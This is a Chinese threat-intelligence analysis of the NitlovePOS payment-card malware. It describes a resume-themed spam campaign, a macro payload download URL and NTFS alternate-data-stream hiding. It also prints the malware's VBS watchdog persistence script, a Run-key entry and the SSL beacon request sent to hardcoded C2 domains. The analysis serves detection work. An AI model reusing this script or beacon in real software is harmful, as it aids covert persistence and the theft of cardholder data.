NitlovePOS:新的POS恶意软件

2015-05-26 10:30:55 阅读：8644次 点赞(0) 收藏 来源： lazynms@360安全播报


在过去的两年中，出现了大量专门为从POS机系统中提取支付卡信息而设计的恶意软件。2015年，各种各样新的POS机恶意软件被识别了出来，包括Alina variant, LogPOS, FighterPOS和Punkey。在我们对垃圾邮件活动的研究中，我们还发现了另一种POS机恶意软件，我们将其称之为NitlovePOS。

NitlovePOS恶意软件通过对目标主机得运行进程进行扫描，从而捕获并预过滤轨道1和轨道2的支付卡数据。然后它会使用SSL将这些数据发送给一个web服务器。

我们相信，网络罪犯可以通过垃圾邮件活动来对目标主机进行，并能够发送指令来控制特定的目标主机去下载POS机恶意软件。

传播

从2015年5月20日起，我们就开始对一个垃圾邮件活动进行监控。这些垃圾邮件提到了可能的就业机会，并声称要附上一份简历。“From”邮件地址骗称是Yahoo! 邮箱账号，并包含以下“主题”：

主题：有工作吗？

主题：有空缺吗？

主题：实习

主题：实习问题

主题：需要实习吗？

主题：招聘启事

主题：招聘问题

主题：我的简历

主题：空缺吗？

邮件含有一个名为CV_[4 numbers].doc或My_Resume_[4 numbers].doc的附件，附件嵌入了恶意宏文件。为了欺骗收件人启用恶意宏，该文档将自称是“受保护文档”。

一旦启用，恶意宏将会下载并执行来自于80.242.123.155/exe/dro.exe的恶意程序。该操作背后的网络罪犯一直在更新有效载荷。到目前为止，我们观察到了：

这些有效载荷通过信标的指引从而连接至相同的服务器，并且接收相应的指令，将额外的恶意软件下载到该服务器中。该服务器包含了各种恶意软件：

我们将注意力转移到了“pos.exe”恶意软件上，并且我们怀疑它可能以POS机为攻击目标。我们推测，一旦攻击者从他们的目标主机中识别出了潜在感兴趣的攻击对象，他们将命令目标主机下载POS机恶意软件。虽然我们在那个服务器上发现了各种可执行文件的下载点，但是我们只发现了三个“POS.EXE”下载点。

技术分析

我们对在80.242.123.155服务器上所发现的”pos.exe” (6cdd93dcb1c54a4e2b036d2e13b51216)的二进制代码进行了分析。（一个新版本的”pos.exe” (b3962f61a4819593233aa5893421c4d1) 于5月22日被上传，该版本采用了不同的文件架构来实现相同的恶意行为。）

二进制代码名为”TAPIBrowser”，编写于2015年5月20日。

文件名称                       : pos.exe

文件大小                       : 141 kB

MD5值: 6cdd93dcb1c54a4e2b036d2e13b51216

文件类型                       : Win32 EXE

设备类型                    : Intel 386 or later, and compatibles

时间戳                      : 2015:05:20 09:02:54-07:00

PE类型                         : PE32

文件描述                : TAPIBrowser MFC Application

文件版本                    : 1, 0, 0, 1

内部名称                  : TAPIBrowser

合法版权                : Copyright (C) 2000

合法商标                 :

原始文件名               : TAPIBrowser.EXE

产品名称                   : TAPIBrowser Application

产品版本                  : 1, 0, 0, 1:

文件的架构只包含三个部分: .rdata , .hidata和 .rsrc，并且入口点位于 .hidata的内部：

当执行时，它将通过NTFS数据流和一个著名的隐藏技术来把自己复制到磁盘上：

~\Local Settings\Temp:defrag.scr

它会创建一个vbs脚本并且将其保存至磁盘中，然后再次使用NTFS数据流(ADS)：

~\Local Settings\Temp:defrag.vbs

通过这几个步骤，这些文件在文件系统中将会被隐藏。因此，这些文件将会更加难以定位和追踪。

一旦恶意软件处于运行状态，”defrag.vbs”脚本监视器将试图通过InstanceDeletion Event将恶意的进程删除。以下是”defrag.vbs”脚本中的代码：

Set f=CreateObject("Scripting.FileSystemObject")
Set W=CreateObject("WScript.Shell")
Do While                      
GetObject("winmgmts:Win32_Process").Create(W.ExpandEnvironmentStrings("""%TMP%:Defrag.scr""    -"),n,n,p)=0
GetObject("winmgmts:\\.\root\cimv2").ExecNotificationQuery("Select * From __InstanceDeletionEvent Within 1 Where TargetInstance ISA 'Win32_Process' AND TargetInstance.ProcessID="&p).NextEvent
if(f.FileExists(WScript.ScriptFullName)=false)then
W.Run(W.ExpandEnvironmentStrings("cmd /C /D type nul > %TMP%:Defrag.scr")), 0, true
Exit Do
End If
Loop

恶意软件能够通过将自己添加到运行注册表键中来确保其在每次重启之后都能够自动运行：

\REGISTRY\MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\"Defrag" = wscript "C:\Users\ADMINI~1\AppData\Local\Temp:defrag.vbs"

NitlovePOS需要在其运行参数中加上”-”,否则它将不会执行任何的恶意行为。这个技术能够对绕过某些监测的方法提供很大的帮助，尤其是那些利用了自动化的技术。下面是恶意软件执行的示例：

     \LOCALS~1\Temp:Defrag.scr" -

     如果提供的是正确的参数，NitlovePOS会将在内存中自行解码，并且开始搜寻支付卡的数据信息。如果操作不成功，NitlovePOS将会睡眠5分钟，然后重新启动并继续搜寻。

     NitlovePOS有三个主线程：

     线程1:SSL C2通信

     线程2:监控邮件槽，等待CC信号

     线程3:内存撤销

     线程1:C2通信

     NitlovePOS将会连接至下列三个硬编码C2服务器中的其中一个：

     systeminfou48[.]ru

    infofinaciale8h[.]ru

    helpdesk7r[.]ru

     这三个域名都指向了同一个IP地址:146.185.221.31。这个IP地址被分配给了一个位于俄罗斯圣彼得堡的网络。

     当NitlovePOS在目标主机上开始运行时，它将会通过SSL调用一个回调函数：

    POST /derpos/gateway.php HTTP/1.1
    User-Agent: nit_love<GUID>
    Host: systeminfou48.ru
    Content-Length: 41
    Connection: Keep-Alive
    Cache-Control: no-cache
    Pragma: no-cache
    F.r.HWAWAWAWA
    <computer name>
    <OS Version>
    Y

用户代理的头部包含一个硬编码字符串“nit_love”和机器的GUID，该标识符不一定唯一，但网络罪犯可以用其作为识别。字符串“HWAWAWAWA”是硬编码，可能是唯一的活动标识符，“F.r”用来计算每个受感染的主机。

线程2：监控邮件槽，等待支付卡数据

邮件槽最基本的功能是提供能够存储数据的共享内存。程序创建邮件槽来作为服务器，客户端可以是同一网络中的其他主机，或者是主机的本地程序，或者是同一进程中的本地线程。

NitlovePOS利用这个特性来存储支付卡信息。邮件槽名称的创建用的是二进制的硬编码字符串：

"\\.\mailslot\95d292040d8c4e31ac54a93ace198142"

一旦邮件槽创建成功，它将会不停地查询其所得到的分配空间。

线程3：内存撤销

NitlovePOS将会运行扫描程序对支付数据进行扫描，但是会跳过系统和“系统空闲进程”。它将尝试匹配轨道1或轨道2的数据，如果发现了数据，它会将数据写入线程2所创建的邮件槽。然后这些信息使用SSL并通过POST方法将数据发送至C2，这使得网络级的检测变得更加困难。

可能的控制面板

在我们的研究期间，我们观察到了一个完全不同的，但是与NitlovePOS服务器有关联的测试控制面板。这个面板被称为 “nitbot“，它与在二进制代码中发现的”nit_love”字符串非常相似，并且存在于一个名叫”derpmo”的目录中。

     信息中所包含的与文本域内容相符的NitlovePOS信标会显示在Nitbot控制面板中。这些信息包括设备的GUID和一个标识符，该标识符会与“组名”对齐，而且网络犯罪分子能够使用它来跟踪多项活动。

控制面板会显示一个“跟踪”名单或盗取来的支付卡的数据。这就表明，这是一个能够从POS机中窃取数据的恶意软件的操作面板，这种恶意软件的功能与NitlovePOS恶意软件的功能类似。

结论

网络犯罪分子可以通过随意散布垃圾邮件来传播POS机恶意软件，并且可以通过这些垃圾邮件将恶意软件部署到目标主机所在网络中的其他主机上。由于POS机的恶意软件的广泛传播，它们最终都将会被发现和检测到。然而，这都是因为带有类似功能的新型POS机恶意软件不断地发展。暂且不论它们在功能上的相似之处，新型变种病毒的初始检测等级十分的低。这样将会给网络犯罪分子一个利用这些新型变种病毒的机会。

我们预计，有着相似功能的新型POS恶意软件将会继续出现以满足网络犯罪市场的需求。
